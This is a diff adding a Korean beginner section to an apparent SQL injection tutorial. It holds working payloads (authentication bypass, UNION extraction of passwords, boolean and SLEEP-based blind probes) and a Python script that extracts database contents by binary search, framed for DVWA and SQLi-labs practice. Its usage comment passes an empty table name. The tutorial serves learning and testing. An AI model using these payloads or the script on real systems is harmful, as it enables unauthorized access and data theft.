@@ -1,5 +1,109 @@
 # SQL Injection 심화 — Blind, Time-based, NoSQL
 
+## 0. 초보자를 위한 개념 이해
+
+### SQL Injection이란?
+
+SQL Injection은 웹 애플리케이션의 데이터베이스 쿼리에 악성 SQL 코드를 삽입하는 공격입니다. 입력값 검증이 없을 때 공격자가 쿼리 구조 자체를 변경하여 인증 우회, 데이터 탈취, 데이터 삭제까지 가능합니다.
+
+**왜 배우는가:**
+```
+SQL Injection 공격 시나리오:
+
+  취약한 로그인 코드:
+    query = "SELECT * FROM users WHERE id='" + user_input + "'"
+
+  정상 입력: admin
+    → SELECT * FROM users WHERE id='admin'
+
+  공격 입력: admin' --
+    → SELECT * FROM users WHERE id='admin' --'
+    → '--' 이후는 주석 처리 → 패스워드 검증 무력화!
+
+  더 심각한 공격: ' OR '1'='1' --
+    → WHERE 조건이 항상 참 → 모든 사용자 반환
+
+  실제 피해 사례:
+  - 수백만 건 개인정보 탈취
+  - DB 완전 삭제 (DROP TABLE)
+  - 시스템 명령어 실행 (xp_cmdshell)
+```
+
+### 핵심 개념 정리
+
+```
+SQL Injection 유형별 이해:
+
+  Error-based:
+    에러 메시지에 DB 정보가 노출됨
+    ' → "You have an error in your SQL syntax..."
+    → 에러 메시지에서 DB 버전, 테이블명 추출
+
+  UNION-based:
+    UNION SELECT로 다른 테이블 데이터를 결과에 추가
+    ' UNION SELECT username, password FROM users --
+
+  Blind SQL Injection (응답이 없을 때):
+    참:  ' AND 1=1 --  → 정상 페이지
+    거짓: ' AND 1=2 --  → 빈 페이지 또는 다른 응답
+    → 참/거짓 응답 차이로 데이터를 한 글자씩 추출
+
+  Time-based Blind:
+    응답 지연으로 참/거짓 판단
+    ' AND SLEEP(5) --  → 5초 지연 → MySQL 확인!
+    → 응답 없어도 DB 정보 추출 가능
+```
+
+### 필요한 도구 및 환경
+- **취약한 실습 환경**: DVWA, SQLi-labs — 로컬에서 안전하게 실습
+- **자동화 도구**: sqlmap — 취약점 자동 탐지 및 데이터 추출
+- **프록시**: Burp Suite — HTTP 요청을 가로채 파라미터 수동 조작
+
+### 기초 실습 예제
+```python
+#!/usr/bin/env python3
+"""Blind SQL Injection 자동화 — 이진 탐색으로 문자 추출 (교육용)."""
+import time
+import requests
+from typing import Optional
+
+def blind_sqli_extract_char(
+    url: str,
+    position: int,
+    column: str,
+    table: str,
+    session: Optional[requests.Session] = None,
+) -> Optional[str]:
+    """
+    Boolean-based Blind SQLi로 특정 위치 문자 추출.
+    실습 환경(DVWA, SQLi-labs)에서만 사용.
+    """
+    client = session or requests.Session()
+    # 이진 탐색으로 ASCII 값 범위 좁히기
+    low, high = 32, 127
+    while low < high:
+        mid = (low + high) // 2
+        # ASCII 값이 mid보다 크면 참 응답
+        payload = f"' AND ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{position},1))>{mid} --"
+        params = {"id": payload}
+        try:
+            response = client.get(url, params=params, timeout=5)
+            # 참 응답 조건: 페이지에 특정 문자열 포함 여부
+            if "Welcome" in response.text or len(response.text) > 1000:
+                low = mid + 1
+            else:
+                high = mid
+        except requests.RequestException:
+            return None
+    return chr(low) if 32 <= low <= 126 else None
+
+# 사용 예시 (실습 환경):
+# URL = "http://localhost/dvwa/vulnerabilities/sqli_blind/?Submit=Submit"
+# char = blind_sqli_extract_char(URL, 1, "user()", "", session)
+```
+
+---
+
 ## 1. SQL Injection 유형 정리
 
 | 유형 | 응답 방식 | 설명 |
